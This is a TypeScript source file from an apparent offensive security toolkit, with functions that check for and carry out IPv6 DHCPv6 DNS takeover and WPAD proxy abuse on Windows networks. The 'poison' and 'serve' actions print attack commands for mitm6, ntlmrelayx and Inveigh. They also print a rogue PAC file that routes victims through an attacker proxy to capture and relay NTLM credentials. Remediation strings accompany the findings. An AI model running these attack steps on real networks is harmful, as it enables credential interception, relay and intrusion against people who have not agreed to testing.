      output.push(`    ntlmrelayx.py -6 -t ldaps://${relay || "<dc>"} --delegate-access`)
      output.push("    Or: Inveigh.exe -IPv6 Y -LLMNR Y")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== IPv6 MITM Vulnerability Assessment ==="
$ErrorActionPreference = 'SilentlyContinue'

Write-Output "[*] Checking IPv6 status on network interfaces..."
$adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
foreach ($a in $adapters) {
    $v6binding = Get-NetAdapterBinding -Name $a.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue
    $v6enabled = $v6binding.Enabled
    $v6addrs = Get-NetIPAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv6 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notmatch '^fe80' }
    $linkLocal = Get-NetIPAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv6 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -match '^fe80' }

    Write-Output "    Interface: $($a.Name) ($($a.InterfaceDescription))"
    Write-Output "    IPv6 Enabled: $v6enabled"
    Write-Output "    Link-Local: $(if ($linkLocal) { $linkLocal.IPAddress } else { 'None' })"
    Write-Output "    Global IPv6: $(if ($v6addrs) { ($v6addrs.IPAddress -join ', ') } else { 'None (VULNERABLE to DHCPv6 spoofing)' })"
    Write-Output ""
}

Write-Output "=== DHCPv6 Client Status ==="
$dhcpv6 = Get-Service dhcp -ErrorAction SilentlyContinue
Write-Output "[*] DHCP Client Service: $(if ($dhcpv6) { $dhcpv6.Status } else { 'Not found' })"

$v6route = Get-NetRoute -AddressFamily IPv6 -ErrorAction SilentlyContinue | Where-Object { $_.DestinationPrefix -eq '::/0' }
if ($v6route) {
    Write-Output "[*] Default IPv6 gateway: $($v6route.NextHop) (Interface: $($v6route.InterfaceAlias))"
} else {
    Write-Output "[*] No default IPv6 gateway — DHCPv6 spoofing will be accepted"
}

Write-Output ""
Write-Output "=== DNS Configuration ==="
$dnsServers = Get-DnsClientServerAddress -ErrorAction SilentlyContinue
foreach ($dns in ($dnsServers | Where-Object { $_.ServerAddresses })) {
    Write-Output "    $($dns.InterfaceAlias): $($dns.ServerAddresses -join ', ') ($($dns.AddressFamily))"
}

Write-Output ""
Write-Output "=== Vulnerability Assessment ==="
$v6Interfaces = Get-NetAdapterBinding -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue | Where-Object { $_.Enabled }
if ($v6Interfaces) {
    Write-Output "[!!!] VULNERABLE: IPv6 is enabled on $($v6Interfaces.Count) interface(s)"
    Write-Output "[*] Attack scenario:"
    Write-Output "    1. Attacker sends DHCPv6 Advertise with high preference"
    Write-Output "    2. Victim accepts and configures attacker as IPv6 DNS server"
    Write-Output "    3. Attacker responds to DNS queries with attacker IP"
    Write-Output "    4. Victim authenticates to attacker (NTLM/Kerberos)"
    Write-Output "    5. Relay authentication to LDAP/SMB/HTTP targets"
    Write-Output ""
    Write-Output "[*] Combine with: ntlm_relay --action relay for credential relay"
    Write-Output "[*] Tools: mitm6 (Python), Inveigh (PS/.NET)"
} else {
    Write-Output "[+] IPv6 disabled on all interfaces — not vulnerable to DHCPv6 takeover"
}

Write-Output ""
Write-Output "=== WPAD Discovery ==="
$wpadDns = Resolve-DnsName wpad -ErrorAction SilentlyContinue
if ($wpadDns) {
    Write-Output "[*] WPAD resolves to: $($wpadDns.IPAddress)"
    Write-Output "[*] Existing WPAD — spoofing may conflict"
} else {
    Write-Output "[!] WPAD does not resolve — DHCPv6 WPAD injection possible"
    Write-Output "[*] Inject WPAD via DHCPv6 option 252 for proxy credential capture"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-NET-010",
      provider: "windows",
      severity: r.stdout.includes("VULNERABLE") ? "high" : "info",
      status: "ENUMERATED",
      resource: "network://ipv6-mitm",
      title: "IPv6 DHCPv6 DNS takeover vulnerability assessment",
      details: r.stdout.substring(0, 500),
      remediation:
        "Disable IPv6 if not needed. Enable DHCPv6 Guard on network switches. Configure Group Policy to prefer IPv4 DNS.",
    })
  }

  if (action === "poison") {
    const targetDomain = domain || (await ps("(Get-ADDomain).DNSRoot", timeout)).stdout.trim()
    const script = `
Write-Output "=== IPv6 DNS Poisoning (DHCPv6 + DNS Reply) ==="
Write-Output "[*] Target domain: ${targetDomain}"
Write-Output ""

Write-Output "[*] Step 1: Enable IPv6 forwarding..."
$currentForwarding = (Get-NetIPInterface -AddressFamily IPv6 -ErrorAction SilentlyContinue).Forwarding
Write-Output "[*] Current IPv6 forwarding: $($currentForwarding | Select-Object -First 1)"

Write-Output ""
Write-Output "[*] Step 2: Start DHCPv6 server..."
Write-Output "[*] Advertising ourselves as preferred IPv6 DNS server"
Write-Output ""

$localV6 = (Get-NetIPAddress -AddressFamily IPv6 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -match '^fe80' } | Select-Object -First 1).IPAddress
$localV4 = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress

Write-Output "[*] Local IPv6 (link-local): $localV6"
Write-Output "[*] Local IPv4: $localV4"
Write-Output ""

Write-Output "[*] DNS spoofing configuration:"
Write-Output "    Domain: ${targetDomain}"
Write-Output "    Spoofed responses will point to: $localV4"
Write-Output ""
Write-Output "[*] High-value DNS targets to spoof:"
Write-Output "    wpad.${targetDomain} → proxy auto-config for credential capture"
Write-Output "    *.${targetDomain} → wildcard for all domain lookups"
Write-Output "    ldap._tcp.${targetDomain} → redirect LDAP for relay"
Write-Output ""

$relayTarget = '${relay || ""}'
if ($relayTarget) {
    Write-Output "[*] Relay target: $relayTarget"
    Write-Output "[*] Captured NTLM auth will be relayed to $relayTarget"
} else {
    Write-Output "[*] No relay target set — credentials will be captured only"
    Write-Output "[*] Use --relay HOST to auto-relay captured auth"
}

Write-Output ""
Write-Output "[!] Full attack requires raw socket access (DHCPv6 = UDP 547)"
Write-Output "[*] Use Inveigh for PowerShell-native implementation:"
Write-Output "    Invoke-Inveigh -IP $localV4 -SpooferIPsReply $localV4 -IPv6"
Write-Output ""
Write-Output "[*] Or Python mitm6:"
Write-Output "    mitm6 -d ${targetDomain} -i <interface>"
Write-Output "    ntlmrelayx.py -6 -t ldaps://<dc> -wh wpad.${targetDomain}"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-NET-011",
      provider: "windows",
      severity: "high",
      status: "ENUMERATED",
      resource: `network://mitm6/${targetDomain}`,
      title: `IPv6 DHCPv6 DNS poisoning setup for ${targetDomain}`,
      details: r.stdout.substring(0, 500),
      remediation:
        "Disable IPv6 via Group Policy. Enable DHCPv6 Guard. Block WPAD via DNS. Enable LDAP signing and channel binding.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function wpadAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const findings: Finding[] = []
  const output: string[] = ["[*] WPAD/PAC proxy abuse...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== WPAD/PAC Proxy Abuse (cmd.exe) ===\n")
    if (action === "check") {
      output.push("[*] Proxy auto-detection settings:")
      const autoDetect = await cmd(
        'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v AutoDetect 2>nul',
        timeout,
      )
      const wpadEnabled = autoDetect.stdout.includes("0x1")
      output.push(
        wpadEnabled ? "[!] WPAD AutoDetect: ENABLED — proxy auto-discovery active" : "[+] WPAD AutoDetect: DISABLED",
      )
      const autoConfig = await cmd(
        'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v AutoConfigURL 2>nul',
        timeout,
      )
      const acUrl = autoConfig.stdout.match(/AutoConfigURL\s+REG_SZ\s+(.+)/)?.[1]?.trim()
      output.push(acUrl ? `[*] AutoConfigURL: ${acUrl}` : "[*] AutoConfigURL: Not set")
      output.push("\n[*] WinHTTP proxy:")
      const winhttp = await cmd("netsh winhttp show proxy", timeout)
      output.push(winhttp.stdout)
      output.push("\n[*] WPAD DNS resolution:")
      const wpadDns = await cmd("nslookup wpad 2>nul", timeout)
      output.push(
        wpadDns.stdout.includes("Name:") ? `[!] wpad resolves:\n${wpadDns.stdout}` : "[-] wpad does not resolve in DNS",
      )
      const wpadDhcp = await cmd('ipconfig /all | findstr /i "DHCP Server"', timeout)
      output.push(`\n[*] DHCP servers:\n${wpadDhcp.stdout}`)
      if (wpadEnabled)
        findings.push({
          checkId: "WIN-WPAD-001",
          provider: "windows",
          severity: "high",
          status: "FAIL",
          resource: "network://wpad",
          title: "WPAD auto-detection enabled — proxy hijack possible",
          details: "AutoDetect=1, attacker can serve rogue wpad.dat via LLMNR/DHCPv6",
          remediation: "Disable WPAD via GPO. Create a DNS record for 'wpad' pointing to safe host.",
        })
    }
    if (action === "serve") {
      output.push("[!] WPAD server requires external tools in cmd mode:")
      output.push("    Responder.py -I <iface> -wrf (serves wpad.dat)")
      output.push("    Inveigh.exe -WPAD Y -WPADAuth NTLM")
      output.push("    Or serve a malicious wpad.dat via any HTTP server on port 80")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== WPAD Configuration Analysis ==="
$ErrorActionPreference = 'SilentlyContinue'

Write-Output "[*] Proxy auto-detection settings:"
$proxySettings = Get-ItemProperty "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -ErrorAction SilentlyContinue
$wpadEnabled = $proxySettings.AutoDetect
Write-Output "    AutoDetect (WPAD): $(if ($wpadEnabled -eq 1) { 'ENABLED' } else { 'DISABLED' })"
Write-Output "    AutoConfigURL: $(if ($proxySettings.AutoConfigURL) { $proxySettings.AutoConfigURL } else { 'Not set' })"
Write-Output "    ProxyServer: $(if ($proxySettings.ProxyServer) { $proxySettings.ProxyServer } else { 'Not set' })"
Write-Output "    ProxyOverride: $(if ($proxySettings.ProxyOverride) { $proxySettings.ProxyOverride } else { 'Not set' })"
Write-Output ""

Write-Output "=== WinHTTP Proxy Settings ==="
$winhttp = & netsh winhttp show proxy 2>&1
Write-Output $winhttp
Write-Output ""

Write-Output "=== WPAD DNS Resolution ==="
$wpadResolve = Resolve-DnsName wpad -ErrorAction SilentlyContinue
if ($wpadResolve) {
    Write-Output "[*] wpad resolves to: $($wpadResolve.IPAddress -join ', ')"
    Write-Output "[*] Existing WPAD server detected"
} else {
    Write-Output "[!] wpad does NOT resolve — WPAD spoofing possible"
}

$fqdn = (Get-WmiObject Win32_ComputerSystem).Domain
$wpadFqdn = Resolve-DnsName "wpad.$fqdn" -ErrorAction SilentlyContinue
if ($wpadFqdn) {
    Write-Output "[*] wpad.$fqdn resolves to: $($wpadFqdn.IPAddress -join ', ')"
} else {
    Write-Output "[!] wpad.$fqdn does NOT resolve — domain WPAD spoofing possible"
}

Write-Output ""
Write-Output "=== WPAD Attack Vectors ==="
if ($wpadEnabled -eq 1) {
    Write-Output "[!!!] WPAD AutoDetect is ENABLED — system actively queries for wpad host"
    Write-Output ""
    Write-Output "[*] Attack options:"
    Write-Output "    1. DNS poisoning: create wpad A record pointing to attacker (adidns_poison)"
    Write-Output "    2. LLMNR/NBT-NS: respond to wpad name query (responder_poison)"
    Write-Output "    3. DHCPv6: inject WPAD URL via option 252 (mitm6)"
    Write-Output ""
    Write-Output "[*] PAC file payload captures NTLM authentication for relay"
    Write-Output "[*] Combine with: ntlm_relay for credential relay to LDAP/SMB"
} else {
    Write-Output "[+] WPAD AutoDetect is disabled for current user"
    Write-Output "[*] Check other users — WPAD is enabled by default on fresh Windows installs"
}

Write-Output ""
Write-Output "=== Domain-Wide WPAD Status ==="
try {
    $gpoWpad = Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -ErrorAction SilentlyContinue
    if ($gpoWpad.AutoDetect -eq 0) {
        Write-Output "[+] WPAD disabled via Group Policy (machine level)"
    } elseif ($gpoWpad.AutoDetect -eq 1) {
        Write-Output "[!] WPAD enabled via Group Policy (machine level)"
    } else {
        Write-Output "[*] No machine-level WPAD GPO — per-user setting applies"
    }
} catch {
    Write-Output "[*] No WPAD Group Policy detected"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-NET-012",
      provider: "windows",
      severity: r.stdout.includes("!!!") ? "high" : "info",
      status: "ENUMERATED",
      resource: "network://wpad",
      title: "WPAD proxy auto-detection vulnerability assessment",
      details: r.stdout.substring(0, 500),
      remediation:
        "Disable WPAD via Group Policy. Create DNS entry for 'wpad' pointing to nothing. Block DHCPv6 option 252.",
    })
  }

  if (action === "serve") {
    const script = `
Write-Output "=== WPAD PAC File Server ==="
Write-Output ""
Write-Output "[*] PAC file content for NTLM credential capture:"
Write-Output ""

$localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
Write-Output "function FindProxyForURL(url, host) {"
Write-Output "    // Force NTLM auth to attacker proxy"
Write-Output "    return 'PROXY $($localIp):8080; DIRECT';"
Write-Output "}"
Write-Output ""
Write-Output "[*] Serve this PAC file at: http://$localIp/wpad.dat"
Write-Output "[*] Clients querying wpad will download this and proxy through us"
Write-Output "[*] Use ntlm_relay to capture and relay the NTLM authentication"
Write-Output ""
Write-Output "[*] Quick serve: python3 -m http.server 80 --bind 0.0.0.0"
Write-Output "    (place wpad.dat in the serve directory)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-NET-013",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "network://wpad/serve",
      title: "WPAD PAC file generation for credential interception",
      details: r.stdout.substring(0, 500),
      remediation:
        "Disable WPAD. Monitor for unexpected proxy configurations. Block unknown WPAD servers at network level.",
    })
  }

  return { output: output.join("\n"), findings }
}
